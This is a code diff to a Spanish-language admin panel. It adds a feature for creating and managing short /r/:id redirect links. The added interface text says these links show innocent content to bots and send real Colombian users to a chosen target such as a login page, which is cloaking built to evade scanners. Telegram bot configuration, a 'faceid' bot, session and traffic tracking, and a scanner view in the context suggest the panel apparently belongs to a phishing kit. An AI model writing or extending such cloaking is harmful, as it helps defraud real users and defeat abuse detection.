@@ -401,6 +401,12 @@ export default function AdminPanel() {
   const [scannerMode, setScannerMode] = useState(false);
   const [scannerLogs, setScannerLogs] = useState<any[]>([]);
   const [scannerLoading, setScannerLoading] = useState(false);
+  const [redirectMode, setRedirectMode] = useState(false);
+  const [redirectLinks, setRedirectLinks] = useState<any[]>([]);
+  const [redirectLoading, setRedirectLoading] = useState(false);
+  const [redirectTarget, setRedirectTarget] = useState("");
+  const [redirectCreating, setRedirectCreating] = useState(false);
+  const [redirectCopied, setRedirectCopied] = useState<string | null>(null);
   const [showConfigModal, setShowConfigModal] = useState(false);
   const [configForm, setConfigForm] = useState({ adminPin: "", telegramBotToken: "", telegramChatId: "", telegramFaceidBotToken: "", telegramFaceidChatId: "" });
   const [configLoading, setConfigLoading] = useState(false);
@@ -775,6 +781,66 @@ export default function AdminPanel() {
     });
     setTrafficLogs([]);
     setTrafficTotal(0);
+  };
+
+  const loadRedirectLinks = async () => {
+    setRedirectLoading(true);
+    try {
+      const pin = sessionStorage.getItem("admin-pin") || "";
+      const res = await fetch("/api/admin/redirect-links", {
+        headers: { "x-admin-pin": pin },
+      });
+      const data = await res.json();
+      if (data.ok) {
+        setRedirectLinks(data.links || []);
+      }
+    } catch (e) {
+      console.error("Failed to load redirect links", e);
+    } finally {
+      setRedirectLoading(false);
+    }
+  };
+
+  const createNewRedirectLink = async () => {
+    if (!redirectTarget.trim()) return;
+    setRedirectCreating(true);
+    try {
+      const pin = sessionStorage.getItem("admin-pin") || "";
+      const res = await fetch("/api/admin/redirect-links", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "x-admin-pin": pin },
+        body: JSON.stringify({ target: redirectTarget.trim() }),
+      });
+      const data = await res.json();
+      if (data.ok) {
+        setRedirectTarget("");
+        loadRedirectLinks();
+      }
+    } catch (e) {
+      console.error("Failed to create redirect link", e);
+    } finally {
+      setRedirectCreating(false);
+    }
+  };
+
+  const deleteRedirectLinkById = async (id: string) => {
+    if (!confirm(`¿Eliminar enlace ${id}?`)) return;
+    try {
+      const pin = sessionStorage.getItem("admin-pin") || "";
+      await fetch(`/api/admin/redirect-links/${id}`, {
+        method: "DELETE",
+        headers: { "x-admin-pin": pin },
+      });
+      loadRedirectLinks();
+    } catch (e) {
+      console.error("Failed to delete redirect link", e);
+    }
+  };
+
+  const copyRedirectUrl = (url: string, id: string) => {
+    navigator.clipboard.writeText(url);
+    setRedirectCopied(id);
+    setTimeout(() => setRedirectCopied(null), 2000);
   };
 
   useEffect(() => {
@@ -1346,6 +1412,16 @@ export default function AdminPanel() {
               }`}
             >
               {scannerMode ? "←" : "🛡️"}<span className="hidden sm:inline ml-1">{scannerMode ? "Volver" : "Escáneres"}</span>
+            </button>
+            <button
+              onClick={() => { setRedirectMode(!redirectMode); if (!redirectMode) { loadRedirectLinks(); setHistoryMode(false); setStatsMode(false); setTrafficMode(false); setScannerMode(false); } }}
+              className={`px-2 sm:px-4 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-medium transition-all border ${
+                redirectMode 
+                  ? "bg-cyan-500/10 text-cyan-400 border-cyan-500/20" 
+                  : "bg-white/5 text-gray-300 border-white/5 hover:bg-white/10"
+              }`}
+            >
+              {redirectMode ? "←" : "🔗"}<span className="hidden sm:inline ml-1">{redirectMode ? "Volver" : "Links"}</span>
             </button>
           <button
             onClick={() => { sessionStorage.removeItem("admin-auth"); setIsAuthenticated(false); }}
@@ -2349,7 +2425,100 @@ export default function AdminPanel() {
         )}
 
         {/* ═══ ACTIVE SESSIONS ═══ */}
-        {!historyMode && !statsMode && !trafficMode && !scannerMode && (
+        {/* ═══ REDIRECT LINKS ═══ */}
+        {redirectMode && (
+          <div className="space-y-4">
+            <div className="flex items-center justify-between">
+              <h2 className={`text-lg font-bold ${theme.text}`}>🔗 Enlaces de Redirección</h2>
+              <button
+                onClick={() => loadRedirectLinks()}
+                className="px-3 py-1.5 rounded-lg text-[11px] font-medium border bg-blue-500/10 text-blue-400 border-blue-500/20 hover:bg-blue-500/20 transition-all active:scale-95"
+              >
+                🔄 Refrescar
+              </button>
+            </div>
+            <div className={`text-xs ${theme.textSecondary}`}>
+              Los enlaces /r/:id muestran contenido inocente a bots y redirigen usuarios reales colombianos al destino.
+            </div>
+
+            {/* Create new link */}
+            <div className={`p-4 rounded-xl border ${theme.border} ${theme.cardBg}`}>
+              <h3 className={`text-sm font-semibold mb-3 ${theme.text}`}>Crear nuevo enlace</h3>
+              <div className="flex gap-2">
+                <input
+                  type="text"
+                  value={redirectTarget}
+                  onChange={(e) => setRedirectTarget(e.target.value)}
+                  placeholder="URL destino (ej: /login o https://...)"
+                  className={`flex-1 px-3 py-2 rounded-lg text-xs border ${theme.border} bg-black/20 ${theme.text} placeholder-gray-500 focus:outline-none focus:ring-1 focus:ring-cyan-500/50`}
+                  onKeyDown={(e) => { if (e.key === "Enter") createNewRedirectLink(); }}
+                />
+                <button
+                  onClick={createNewRedirectLink}
+                  disabled={redirectCreating || !redirectTarget.trim()}
+                  className="px-4 py-2 rounded-lg text-xs font-medium bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 hover:bg-cyan-500/30 transition-all active:scale-95 disabled:opacity-40 disabled:cursor-not-allowed"
+                >
+                  {redirectCreating ? "..." : "➕ Crear"}
+                </button>
+              </div>
+            </div>
+
+            {/* Links list */}
+            {redirectLoading ? (
+              <div className={`text-center py-8 ${theme.textSecondary}`}>Cargando...</div>
+            ) : redirectLinks.length === 0 ? (
+              <div className={`text-center py-12 ${theme.textSecondary}`}>
+                <div className="w-14 h-14 mx-auto mb-4 rounded-full bg-cyan-500/10 flex items-center justify-center border border-cyan-500/20">
+                  <span className="text-2xl">🔗</span>
+                </div>
+                <p className="font-medium">Sin enlaces de redirección</p>
+                <p className="mt-1 text-[11px]">Crea un enlace arriba para compartir de forma segura</p>
+              </div>
+            ) : (
+              <div className="space-y-2">
+                {redirectLinks.map((link: any) => (
+                  <div key={link.id} className={`p-3 rounded-xl border ${theme.border} ${theme.cardBg} flex flex-col sm:flex-row sm:items-center gap-2`}>
+                    <div className="flex-1 min-w-0">
+                      <div className="flex items-center gap-2">
+                        <span className="text-xs font-mono font-bold text-cyan-400">/r/{link.id}</span>
+                        <span className="text-[10px] px-1.5 py-0.5 rounded bg-green-500/10 text-green-400 border border-green-500/20">
+                          {link.uses || 0} usos
+                        </span>
+                      </div>
+                      <div className={`text-[11px] mt-1 ${theme.textSecondary} truncate`}>
+                        Destino: <span className="text-gray-300">{link.target}</span>
+                      </div>
+                      <div className={`text-[10px] mt-0.5 ${theme.textSecondary}`}>
+                        Creado: {new Date(link.created).toLocaleString("es-CO")}
+                      </div>
+                    </div>
+                    <div className="flex items-center gap-1.5 shrink-0">
+                      <button
+                        onClick={() => copyRedirectUrl(`${window.location.origin}/r/${link.id}`, link.id)}
+                        className={`px-2.5 py-1.5 rounded-lg text-[10px] font-medium border transition-all active:scale-95 ${
+                          redirectCopied === link.id
+                            ? "bg-green-500/20 text-green-400 border-green-500/30"
+                            : "bg-white/5 text-gray-300 border-white/10 hover:bg-white/10"
+                        }`}
+                      >
+                        {redirectCopied === link.id ? "✓ Copiado" : "📋 Copiar"}
+                      </button>
+                      <button
+                        onClick={() => deleteRedirectLinkById(link.id)}
+                        className="px-2.5 py-1.5 rounded-lg text-[10px] font-medium border bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20 transition-all active:scale-95"
+                      >
+                        🗑️
+                      </button>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ═══ ACTIVE SESSIONS ═══ */}
+        {!historyMode && !statsMode && !trafficMode && !scannerMode && !redirectMode && (
           <div className="space-y-6">
             {/* Search Bar */}
             <div className="relative">
